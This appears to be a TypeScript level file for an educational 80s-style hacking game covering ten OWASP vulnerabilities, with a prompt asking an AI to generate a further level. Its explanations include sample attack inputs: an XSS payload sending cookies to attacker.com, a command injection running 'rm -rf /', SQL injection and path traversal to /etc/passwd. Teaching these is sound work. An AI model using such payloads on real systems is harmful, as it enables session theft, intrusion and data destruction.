import type { Level } from "@/app/types"

export const levels: Level[] = [
  {
    id: 1,
    title: "SQL Injection Attack",
    vulnerability:
      "SQL Injection allows attackers to insert malicious SQL code into input fields, bypassing authentication and accessing sensitive data.",
    tool: "sqlmap-lite",
    description: `SQL Injection is one of the most common web vulnerabilities. When user input is directly concatenated into SQL queries without proper validation or parameterized queries, attackers can manipulate database operations.

Example vulnerable code:
  query = "SELECT * FROM users WHERE username='" + userInput + "'"

An attacker could input: admin' --
This would result in: SELECT * FROM users WHERE username='admin' --'
The -- comments out the password check, granting access without authentication.

Use sqlmap-lite to find and exploit the SQL injection vulnerability in the login form.`,
    expectedCommand: "sqlmap-lite --target=login.form --inject=username --dump-tables",
    hint: "Try using --inject flag with the username field to extract database tables",
  },
  {
    id: 2,
    title: "Cross-Site Scripting (XSS)",
    vulnerability:
      "XSS allows attackers to inject malicious scripts into web pages viewed by other users, stealing cookies, sessions, or performing unauthorized actions.",
    tool: "xss-probe",
    description: `Cross-Site Scripting (XSS) occurs when user input is reflected in HTML without proper encoding. There are three types:
    - Stored XSS: Malicious script is saved in database and executed for all users
    - Reflected XSS: Script is reflected in the response to a request
    - DOM-based XSS: Script manipulates the DOM on the client side

Example vulnerable code:
  <h1>Welcome, \${userInput}</h1>

An attacker could inject: <img src=x onerror="fetch('attacker.com/steal?c='+document.cookie)">

Use xss-probe to detect and exploit XSS vulnerabilities on the comment form.`,
    expectedCommand: "xss-probe --target=comments --payload=<script>alert(1)</script>",
    hint: "Try targeting the comments field with a basic script payload",
  },
  {
    id: 3,
    title: "Cross-Site Request Forgery (CSRF)",
    vulnerability:
      "CSRF tricks authenticated users into performing unintended actions on a website where they are logged in.",
    tool: "csrf-forge",
    description: `Cross-Site Request Forgery (CSRF) exploits the trust between a user and a website. If a user is logged into a bank and visits a malicious site, that site can make unauthorized requests using the user's authenticated session.

Example attack:
User is logged into their-bank.com
User visits attacker-site.com which contains:
  <img src="their-bank.com/transfer?to=attacker&amount=1000">

The browser automatically sends the user's authenticated cookies, executing the transfer!

Use csrf-forge to generate and execute a CSRF attack against the money transfer endpoint.`,
    expectedCommand: "csrf-forge --endpoint=/transfer --params=to:attacker,amount:9999 --session-hijack",
    hint: "Create a forge request with transfer parameters targeting the money endpoint",
  },
  {
    id: 4,
    title: "Insecure Direct Object References (IDOR)",
    vulnerability:
      "IDOR allows attackers to access unauthorized resources by directly modifying object references (like IDs in URLs).",
    tool: "idor-scanner",
    description: `Insecure Direct Object References (IDOR) occurs when an application uses user-controlled input to directly access objects without proper authorization checks.

Example vulnerable endpoint:
  GET /api/users/123/profile

An attacker could change the ID to:
  GET /api/users/124/profile
  GET /api/users/1/profile (to access admin)

Without proper authorization checks on the backend, the attacker gains access to other users' data.

Use idor-scanner to enumerate and access user profiles you shouldn't have access to.`,
    expectedCommand: "idor-scanner --endpoint=/api/users --range=1-1000 --extract=email,phone,ssn",
    hint: "Scan the user endpoint with a range of IDs to find sensitive data",
  },
  {
    id: 5,
    title: "Server-Side Request Forgery (SSRF)",
    vulnerability:
      "SSRF allows attackers to make the server perform HTTP requests to internal systems it can access, bypassing firewalls and access controls.",
    tool: "curl-ssrf",
    description: `Server-Side Request Forgery (SSRF) tricks the server into making requests to internal resources. The attacker controls where the server sends requests.

Example vulnerable code:
  fetch(user_provided_url)

An attacker could provide:
  http://localhost:8080/admin (accessing internal admin panel)
  http://169.254.169.254/metadata (accessing cloud metadata)
  http://internal-database:5432 (accessing internal database)

Use curl-ssrf to make the server request internal resources you shouldn't have access to.`,
    expectedCommand: "curl-ssrf --method=GET --target=http://localhost:8080/admin --exfiltrate",
    hint: "Try targeting localhost services or internal IP addresses",
  },
  {
    id: 6,
    title: "Remote Code Execution (RCE)",
    vulnerability:
      "RCE allows attackers to execute arbitrary code on the server, gaining complete control over the system.",
    tool: "payload-injector",
    description: `Remote Code Execution (RCE) is the most critical vulnerability. It occurs when user input is used to execute code without sanitization.

Common RCE vectors:
  - Unsafe deserialization
  - Command injection: system("user_input")
  - Template injection: render("user_input")
  - Expression injection: eval(user_input)

Example vulnerable code:
  system("ping " + user_host)

An attacker could input: google.com; rm -rf /
This executes: ping google.com; rm -rf /

Use payload-injector to inject commands and achieve remote code execution.`,
    expectedCommand: "payload-injector --vector=command-injection --payload=; whoami; --target=ping-service --execute",
    hint: "Try injecting shell commands with semicolons as separators",
  },
  {
    id: 7,
    title: "Path Traversal",
    vulnerability:
      'Path Traversal allows attackers to access files outside the intended directory by using path sequences like "../".',
    tool: "path-crawler",
    description: `Path Traversal (Directory Traversal) exploits improper path validation to access files and directories the application shouldn't expose.

Example vulnerable endpoint:
  GET /files?name=report.pdf
  Reads: /var/www/uploads/report.pdf

An attacker could request:
  GET /files?name=../../etc/passwd
  Reads: /etc/passwd (system user file)

Common sequences:
  ../ (Unix/Linux)
  ..\\ (Windows)
  ....// (bypass simple ../ filters)
  %2e%2e%2f (URL encoded)

Use path-crawler to navigate the file system and access sensitive configuration files.`,
    expectedCommand: "path-crawler --base=/files --traverse=../../../../../../etc/passwd --read",
    hint: "Use relative path traversal sequences to escape the upload directory",
  },
  {
    id: 8,
    title: "Broken Authentication",
    vulnerability:
      "Broken Authentication allows attackers to bypass login mechanisms through weak passwords, session fixation, or credential stuffing.",
    tool: "auth-cracker",
    description: `Broken Authentication includes various vulnerabilities in authentication mechanisms:
  - Weak password policies
  - Session fixation attacks
  - Predictable session tokens
  - Lack of rate limiting on login attempts
  - No account lockout mechanisms

Example weaknesses:
  - Passwords stored as plain text (instead of hashed)
  - Session IDs predictable: 1, 2, 3, 4...
  - No multi-factor authentication
  - Sessions never expire
  - Passwords like "admin", "123456", "password"

Use auth-cracker to bypass authentication through credential stuffing and weak session tokens.`,
    expectedCommand: "auth-cracker --mode=credential-stuff --wordlist=common-passwords.txt --session-enum --force",
    hint: "Try common passwords and enumerate session IDs",
  },
  {
    id: 9,
    title: "Security Misconfiguration",
    vulnerability:
      "Security Misconfiguration includes leaving default credentials, exposing debug information, and improperly configured security headers.",
    tool: "config-scanner",
    description: `Security Misconfiguration vulnerabilities result from improper setup and maintenance:
  - Default credentials still active (admin/admin, admin/password)
  - Debug mode enabled in production
  - Unnecessary services exposed
  - Missing security headers
  - Outdated software with known vulnerabilities
  - Overly permissive access controls
  - Stack traces exposed in error messages

Example issues:
  - Response header: Server: Apache 2.4.1 (reveals version for targeting known exploits)
  - Error page shows file paths and database info
  - Admin panel at /admin with default credentials
  - S3 bucket publicly readable

Use config-scanner to identify misconfigurations and access restricted areas.`,
    expectedCommand: "config-scanner --scan-headers --probe-defaults --enum-services --extract-version-info",
    hint: "Scan for default credentials, exposed headers, and debug endpoints",
  },
  {
    id: 10,
    title: "Sensitive Data Exposure",
    vulnerability:
      "Sensitive Data Exposure occurs when sensitive information (passwords, API keys, PII) is transmitted or stored without proper protection.",
    tool: "data-exfiltrator",
    description: `Sensitive Data Exposure includes improper handling of sensitive information:
  - Data transmitted over unencrypted HTTP (not HTTPS)
  - Sensitive data in browser history, logs, or cache
  - Weak encryption algorithms
  - Hardcoded secrets in source code
  - API keys exposed in public repositories
  - Personal information (PII) not properly protected
  - Database backups with full data available

Examples of exposed sensitive data:
  - Credit card numbers in response without hashing
  - API keys in front-end JavaScript
  - Passwords logged in plaintext
  - Tokens cached in browser storage
  - Database connection strings in config files

Use data-exfiltrator to identify and extract sensitive data.`,
    expectedCommand: "data-exfiltrator --scan=network,storage,logs --extract-secrets --decode-base64 --output-report",
    hint: "Search for secrets in network traffic, browser storage, and server logs",
  },
]

export const getDynamicLevelPrompt = () => {
  return `Generate a cybersecurity OWASP Top 10 vulnerability level for an 80s retro terminal hacker game. Create level 11 which is unique and different from: SQL Injection, XSS, CSRF, IDOR, SSRF, RCE, Path Traversal, Broken Authentication, Security Misconfiguration, and Sensitive Data Exposure.

Return ONLY valid JSON in this exact format, no markdown, no extra text:
{
  "title": "Vulnerability Name",
  "vulnerability": "One sentence description of what this vulnerability is",
  "tool": "tool-name-here",
  "description": "Detailed explanation with examples of how this vulnerability works",
  "expectedCommand": "correct command to execute the attack"
}

Make sure the expectedCommand is a realistic tool command that would exploit this vulnerability. Be creative with OWASP vulnerabilities like Broken Access Control, Injection variants, Deserialization, XXE, etc.`
}
